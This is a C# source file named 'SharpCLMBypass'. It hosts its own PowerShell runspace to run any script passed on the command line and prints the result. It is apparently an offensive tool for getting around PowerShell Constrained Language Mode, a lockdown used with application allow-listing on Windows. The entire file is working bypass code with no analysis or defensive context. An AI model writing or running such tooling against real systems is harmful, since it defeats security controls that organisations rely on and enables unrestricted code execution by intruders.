using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace SharpCLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = args[0];
            ps.AddScript(cmd);
            Collection<PSObject> output = ps.Invoke();
            foreach (PSObject pSObject in output)
            {
                Console.WriteLine(pSObject.ToString());
            }
            rs.Close();
        }
    }
}
